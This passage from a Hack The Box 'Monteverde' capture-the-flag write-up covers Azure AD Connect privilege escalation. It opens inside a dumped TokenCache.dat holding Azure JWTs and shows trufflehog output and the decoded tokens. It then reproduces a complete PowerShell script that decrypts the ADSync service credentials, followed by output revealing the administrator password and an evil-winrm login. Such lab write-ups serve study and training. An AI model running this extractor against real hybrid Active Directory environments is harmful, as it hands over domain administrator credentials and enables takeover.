0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw","AccessTokenType":"Bearer","ExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedExpiresOn":{"DateTime":"\/Date(1578062154521)\/","OffsetMinutes":0},"ExtendedLifeTimeToken":false,"IdToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.","TenantId":"372efea9-7bc4-4b76-8839-984b45edfb98","UserInfo":{"DisplayableId":"john@a67632354763outlook.onmicrosoft.com","FamilyName":"Clark","GivenName":"John","IdentityProvider":"https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/","PasswordChangeUrl":null,"PasswordExpiresOn":null,"UniqueId":"e4f56bc1-021f-4795-bca2-bedfc819e90a"}},"UserAssertionHash":null}
```
Inside our user's home folder there's an `.Azure` directory which contains a file called `TokenCache.dat` which appears to be various settings and tokens related to an azure tenant.

```zsh
└─$ trufflehog filesystem .
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-10-24T01:49:16-04:00	info-0	trufflehog	running source	{"source_manager_worker_id": "GKryL", "with_units": true}
Found unverified result 🐷🔑❓
Detector Type: JWT
Decoder Type: PLAIN
Raw result: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw
Iss: https://sts.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/
Iat: 2020-01-03 08:30:57 -0500 EST
Exp: 2020-01-03 09:35:57 -0500 EST
Alg: RS256
File: TokenCache.dat
Line: 1

Found unverified result 🐷🔑❓
Detector Type: JWT
Decoder Type: PLAIN
Raw result: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA
Alg: RS256
Iss: https://sts.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/
Iat: 2020-01-03 08:31:16 -0500 EST
Exp: 2020-01-03 09:36:16 -0500 EST
File: TokenCache.dat
Line: 1

2026-10-24T01:49:16-04:00	info-0	trufflehog	finished scanning	{"chunks": 5, "bytes": 11115, "verified_secrets": 0, "unverified_secrets": 2, "scan_duration": "7.474446ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}
```
Using `trufflehog` we analyze this data file to discover two JWTs.

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "x5t": "piVlloQDSMKxh1m2ygqGSVdgFpA",
  "kid": "piVlloQDSMKxh1m2ygqGSVdgFpA"
}

{
  "aud": "https://graph.windows.net/",
  "iss": "https://sts.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/",
  "iat": 1578058276,
  "nbf": 1578058276,
  "exp": 1578062176,
  "acr": "1",
  "aio": "42VgYAgsYspObGmb58Wvl+Gww8bap8nxh9iR8JUB+x9d9/H60AAA",
  "amr": [
    "pwd"
  ],
  "appid": "1950a258-227b-4e31-a9cf-717495945fc2",
  "appidacr": "0",
  "family_name": "Clark",
  "given_name": "John",
  "ipaddr": "46.4.223.173",
  "name": "John",
  "oid": "e4f56bc1-021f-4795-bca2-bedfc819e90a",
  "puid": "100320009396302B",
  "scp": "62e90394-69f5-4237-9190-012177145e10",
  "sub": "UaS0b9drl2ifc9oIvcqAeo4hcw5ajrWx7mNC2Ik2Dlk",
  "tenant_region_scope": "EU",
  "tid": "372efea9-7bc4-4b76-8839-984b45edfb98",
  "unique_name": "john@a67632354763outlook.onmicrosoft.com",
  "upn": "john@a67632354763outlook.onmicrosoft.com",
  "uti": "l3lAGsAEV0qWPzRuVHxSAA",
  "ver": "1.0"
}
```
Decoding either of the two tokens reveals them to be Azure Access 1.0 tokens. for a user named John Clark. However. With these tokens in place we should be able to use the localized `Az` module in powershell.

```zsh
*Evil-WinRM* PS C:\Users\mhope\.Azure> Get-AzContext

Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId
----                                     -------                                              ----------------                                    -----------                                         --------
372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com            
```
Taking a total shot in the dark with our current user being an Azure Domain Admin I called for the Az context and got output corresponding to what our token told us earlier. This is a good sign. This means that `Azure Ad Connect` is installed. 

After several head scratching hours I broke down and looked to the hint in the HTB machine. It mentions [this article ](https://blog.xpnsec.com/azuread-connect-for-redteam) which describes anyone with the Azure AD Replication permission set (Azure Admins included) can dump the local administrator's password by intercepting the data being replicated from AD to Azure. However, even after trying to read and use the PoC mentioned I struggled to get the creds to dump until I found this [POC](https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/tree/main) instead which also references the original article.

## Privilege Escalation
### Azure AD Connect for Red Teamers
![Pasted image 20261024001721.png](/img/user/CTFs/HTB/Images/Monteverde%20Images/Pasted%20image%2020261024001721.png)
We are essentially making a DCSync Attack but instead of it being between all on-prem devices it intercepts the sync from on prem AD to Azure.

![Pasted image 20261024001916.png](/img/user/CTFs/HTB/Images/Monteverde%20Images/Pasted%20image%2020261024001916.png)
We can then abuse that permission to dump the credentials of the user used in the ADSync process.

#### Exploit Steps
##### Script Download
```zsh

# Azure AD Connect Sync Credential Extractor for Authorized Pentesting Only
# This script is intended for authorized penetration testing of Azure AD Connect environments.
# Unauthorized use of this script to extract credentials without permission is illegal and unethical.

# List of potential connection strings to try for connecting to the ADSync database
$connectionStrings = @(
    "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=127.0.0.1;Initial Catalog=ADSync;Integrated Security=True",
    "Data Source=localhost\SQLEXPRESS;Initial Catalog=ADSync;Integrated Security=True"
)

# Variable to track if a successful connection is made
$connectionSuccess = $false

# Attempt to connect to the SQL database using the different connection strings
foreach ($connectionString in $connectionStrings) {
    try {
        Write-Host "Attempting connection: $connectionString"
        $client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString
        $client.Open()
        Write-Host "Connection successful!"
        $connectionSuccess = $true
        break
    }
    catch [System.Exception] {
        Write-Host "Error connecting to SQL database. Trying next..."
     Write-Host 'Exception Message: $($_.Exception.Message)'
    }
}

# Exit if no connection was successful
if (-not $connectionSuccess) {
    Write-Host "All connection attempts failed. Ensure the SQL Server is running and accessible."
    exit
}

# Query for cryptographic keyset information from the mms_server_configuration table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()

if (!$reader.Read()) {
    Write-Host "Failed to retrieve keyset information."
    exit
}

# Store the retrieved cryptographic information
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# Query for encrypted configuration and credentials from the mms_management_agent table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()

if (!$reader.Read()) {
    Write-Host "Failed to retrieve configuration."
    exit
}

# Store the encrypted credentials and configuration
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# Paths to look for mcrypt.dll, used for decryption
$mcryptPaths = @(
    "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll",
    "C:\Program Files (x86)\Microsoft Azure AD Sync\Bin\mcrypt.dll",
    "C:\Program Files\Microsoft Azure AD Connect\Bin\mcrypt.dll"
)

$dllLoaded = $false

# Attempt to load mcrypt.dll from the known paths
foreach ($dllPath in $mcryptPaths) {
    if (Test-Path $dllPath) {
        try {
            Write-Host "Loading mcrypt.dll from: $dllPath"
            Add-Type -Path $dllPath
            $dllLoaded = $true
            break
        }
        catch {
            Write-Host "Error loading mcrypt.dll from $dllPath"
        }
    }
}

# Exit if mcrypt.dll could not be loaded
if (-not $dllLoaded) {
    Write-Host "Failed to load mcrypt.dll. Ensure it exists in one of the expected paths."
    exit
}

# Decrypt the encrypted credentials using the KeyManager class from mcrypt.dll
try {
    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)

    $key = $null
    $km.GetActiveCredentialKey([ref]$key)

    $key2 = $null
    $km.GetKey(1, [ref]$key2)

    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
}
catch {
    Write-Host "Error loading KeyManager or decrypting credentials."
    exit
}

# Extract domain, username, and password from the decrypted configuration
try {
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

    # Output the credentials to the user
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
catch {
    Write-Host "Error extracting domain, username, or password."
    exit
}
```
First we download this script to our local machine. It's a powershell script that connects to the local Microsoft SQL DB for ADSync replication. Dumps the cryptographic keys and decrypts the creds for the AD Sync user.

##### Exploit
```zsh
*Evil-WinRM* PS C:\Users\mhope\Documents> ./AD_Conn.ps1
Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
Error connecting to SQL database. Trying next...
Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
Connection successful!
Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
We successfully decrypt the `administrator` user's password to plaintext via the Azure AD Connect vulnerability PoC. As you can see it cycles through several different syntaxes to connect to the DB.
##### Profit 
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/monteverde/exploit]
└─$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/23/2026   9:44 PM             34 root.txt
```
With our newly stolen creds we are able to find `root.txt` on the `administrator` user's Desktop. Pwned.

## Final Thoughts
>[!Takeaways]
>- Whenever you find a `.Azure` directory it would be prudent to check their group permissions and see if they qualify for the Azure AD Connect DC Sync vulnerability.
>- Learn more about Azure AD and how hybrid environments connect and work together.
>- Decoding Azure 1.0 tokens is a good sign of Azure AD Connect.
>- The Synchronization Service user from the beginning could act as another tell that Azure AD Replication is taking place.

